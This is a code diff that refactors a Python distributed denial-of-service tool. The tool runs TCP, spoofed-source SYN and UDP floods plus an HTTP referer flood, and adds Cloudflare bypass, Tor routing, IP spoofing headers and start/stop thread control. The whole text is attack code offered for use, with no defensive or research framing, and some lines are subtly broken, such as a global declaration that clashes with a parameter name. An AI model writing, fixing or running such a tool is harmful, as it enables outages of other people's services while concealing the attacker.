@@ -33,19 +33,33 @@
  from urllib.parse import urlparse
  import cfscrape #Bypass Cloudflare
  from contextlib import suppress
+ from queue import Queue
+ import signal
  
 
  # Configuration
- TARGET = sys.argv[1] if len(sys.argv] > 1 else input("\033[32mEnter target URL: \033[0m")  # Dark Green
+ TARGET = sys.argv[1] if len(sys.argv) > 1 else input("\033[32mEnter target URL: \033[0m")  # Dark Green
  parsed_url = urlparse(TARGET)
- PORT = int(sys.argv[2]) if len(sys.argv] > 2 else (443 if parsed_url.scheme == 'https' else 80)
- THREADS = int(sys.argv[3]) if len(sys.argv] > 3 else 500
- PAYLOAD_SIZE = int(sys.argv[4]) if len(sys.argv] > 4 else 65500 # MAXIMUM TCP SIZE
+ PORT = int(sys.argv[2]) if len(sys.argv) > 2 else (443 if parsed_url.scheme == 'https' else 80)
+ THREADS = int(sys.argv[3]) if len(sys.argv) > 3 else 500
+ PAYLOAD_SIZE = int(sys.argv[4]) if len(sys.argv) > 4 else 65500 # MAXIMUM TCP SIZE
  TIMEOUT = 2
  USE_TOR = input("\033[32mUse Tor proxy? (y/n): \033[0m").lower() == 'y'  # Dark Green
  TOR_PORT = 9050  # Default Tor port
  CONTROL_PORT = 9051  # Tor control port
  BYPASS_CLOUDFLARE = True
+ 
+
+ # Global flag to control attack threads
+ attack_running = True
+ 
+
+ # Queue for tasks
+ task_queue = Queue()
+ 
+
+ # List to hold threads
+ threads = []
  
 
  USER_AGENTS = [
@@ -81,8 +95,8 @@
  
 
  # Function to create a socket and send data
- def attack():
-  while True:
+ def tcp_attack(target, port, use_tor=False):
+  while attack_running:
   try:
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.settimeout(TIMEOUT)
@@ -90,19 +104,19 @@
 
   # Try to resolve domain name
   try:
-  ip = socket.gethostbyname(TARGET)
+  ip = socket.gethostbyname(target)
   except socket.gaierror:
-  log(f"\033[31mCould not resolve host: {TARGET}\033[0m")  # Dark Red
-  break
+  log(f"\033[31mCould not resolve host: {target}\033[0m")  # Dark Red
+  return
  
 
   # Connect via Tor if USE_TOR is True
-  if USE_TOR:
+  if use_tor:
   socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", TOR_PORT)  # Default Tor port
   socket.socket = socks.socksocket  # Use SOCKS socket
  
 
-  s.connect((ip, PORT))
+  s.connect((ip, port))
  
 
   # Add TCP Socket options
@@ -112,7 +126,7 @@
   # Build HTTP request
   http_header = (
   f"GET / HTTP/1.1\r\n"
-  f"Host: {TARGET}\r\n"
+  f"Host: {target}\r\n"
   f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
   f"X-Forwarded-For: {generate_random_ip()}\r\n"  # Spoof IP
   f"Connection: Keep-Alive\r\n"
@@ -126,7 +140,7 @@
   s.send(payload.encode('utf-8'))
  
 
-  log(f"\033[34mSent {len(payload)} bytes to {TARGET}:{PORT}\033[0m")  # Dark Blue
+  log(f"\033[34mSent {len(payload)} bytes to {target}:{port}\033[0m")  # Dark Blue
   s.close()
  
 
@@ -141,26 +155,9 @@
 
  
 
- # Setup threads
- threads = []
- for _ in range(THREADS):
-  t = threading.Thread(target=attack)
-  t.daemon = True  # Daemonize thread
-  threads.append(t)
- 
-
- # Start threads
- for t in threads:
-  t.start()
- 
-
- print(f"\033[32mStarting DDoS attack on {TARGET}:{PORT} with {THREADS} threads...\033[0m")  # Dark Green
- log(f"\033[32mStarting DDoS attack on {TARGET}:{PORT} with {THREADS} threads...\033[0m")  # Dark Green
- 
-
  # Function to perform SYN flood attack
  def syn_flood(target_ip, target_port):
-  while True:
+  while attack_running:
   try:
   # Craft a SYN packet
   ip = IP(src=generate_random_ip(), dst=target_ip)
@@ -177,7 +174,7 @@
  
 
  def udp_flood(target_ip, target_port):
-  while True:
+  while attack_running:
   try:
   # Craft a UDP packet
   ip = IP(src=generate_random_ip(), dst=target_ip)
@@ -191,24 +188,6 @@
   except Exception as e:
   log(f"\033[31mAn unexpected error occurred in udp_flood: {e}\033[0m")  # Dark Red
   log(traceback.format_exc())
- 
-
- # Start SYN flood threads
- for _ in range(THREADS):
-  t = threading.Thread(target=syn_flood, args=(TARGET, PORT))
-  t.daemon = True
-  threads.append(t)
-  t.start()
- 
-
- 
-
- # Start UDP flood threads
- for _ in range(THREADS):
-  t = threading.Thread(target=udp_flood, args=(TARGET, PORT))
-  t.daemon = True
-  threads.append(t)
-  t.start()
  
 
  # Function to renew Tor identity
@@ -461,26 +440,26 @@
   return False
  
 
- def referer_attack():
-  while True:
+ def referer_attack(target, use_tor=False):
+  while attack_running:
   try:
   referer = generate_referer()
   # Setup proxy if USE_TOR is True
   proxies = {}
-  if USE_TOR:
+  if use_tor:
   proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
  
 
   if BYPASS_CLOUDFLARE:
-  bypassed = bypass_cloudflare(TARGET)
+  bypassed = bypass_cloudflare(target)
   if bypassed:
   log("\033[32mSuccessfully bypassed Cloudflare.\033[0m")  # Dark Green
   else:
   log("\033[31mFailed to bypass Cloudflare.\033[0m")  # Dark Red
  
 
-  requests.get(TARGET, headers={'Referer': referer, 'User-Agent': random.choice(USER_AGENTS)}, proxies=proxies, timeout=TIMEOUT)
-  log(f"\033[34mSent referer: {referer} to {TARGET}\033[0m")  # Dark Blue
+  requests.get(target, headers={'Referer': referer, 'User-Agent': random.choice(USER_AGENTS)}, proxies=proxies, timeout=TIMEOUT)
+  log(f"\033[34mSent referer: {referer} to {target}\033[0m")  # Dark Blue
   except requests.exceptions.RequestException as e:
   log(f"\033[31mRequest error: {e}\033[0m")  # Dark Red
   except Exception as e:
@@ -489,22 +468,69 @@
   time.sleep(random.uniform(0.01, 0.1)) # Faster Rate
  
 
- # Setup threads for referer attacks
- for _ in range(THREADS):
-  t = threading.Thread(target=referer_attack)
-  t.daemon = True
-  threads.append(t)
+ def worker():
+  while True:
+  task = task_queue.get()
+  try:
+  task()
+  except Exception as e:
+  log(f"\033[31mError executing task: {e}\033[0m")
+  log(traceback.format_exc())
+  finally:
+  task_queue.task_done()
  
 
- # Start threads
- for t in threads:
+ def start_attack(target, port, threads, use_tor):
+  global attack_running, threads
+  attack_running = True
+ 
+
+  # Start threads for TCP attack
+  for _ in range(threads):
+  task_queue.put(lambda: tcp_attack(target, port, use_tor))
+  # Start threads for SYN flood
+  task_queue.put(lambda: syn_flood(target, port))
+  # Start threads for UDP flood
+  task_queue.put(lambda: udp_flood(target, port))
+  # Start threads for referer attacks
+  task_queue.put(lambda: referer_attack(target, use_tor))
+  log(f"\033[32mStarting referer attack on {target} with {threads} threads...\033[0m")  # Dark Green
+  log(f"\033[32mStarting DDoS attack on {TARGET}:{PORT} with {THREADS} threads...\033[0m")  # Dark Green
+ 
+
+  # Create worker threads
+  for _ in range(threads * 4):  # Multiply by 4 since there are 4 types of attacks
+  t = threading.Thread(target=worker)
+  t.daemon = True
+  threads.append(t)
   t.start()
  
 
- print(f"\033[32mStarting referer attack on {TARGET} with {THREADS} threads...\033[0m")  # Dark Green
- log(f"\033[32mStarting referer attack on {TARGET} with {THREADS} threads...\033[0m")  # Dark Green
+ def stop_attack():
+  global attack_running
+  attack_running = False
+  task_queue.join()  # Wait for all tasks to be completed
+  for t in threads:
+  t.join(timeout=1)  # Wait for threads to finish
  
 
- # Keep main script running
- while True:
-  time.sleep(1)
+  log("\033[31mStopping all attack threads...\033[0m")
+ 
+
+ def signal_handler(sig, frame):
+  print("\nCtrl+C detected. Stopping the attack...")
+  stop_attack()
+  sys.exit(0)
+ 
+
+ if __name__ == "__main__":
+  signal.signal(signal.SIGINT, signal_handler)
+  print("Type 'start' to begin the attack, or 'stop' to end it.")
+  while True:
+  command = input("> ").lower()
+  if command == 'start':
+  start_attack(TARGET, PORT, THREADS, USE_TOR)
+  elif command == 'stop':
+  stop_attack()
+  else:
+  print("Invalid command. Use 'start' or 'stop'.")
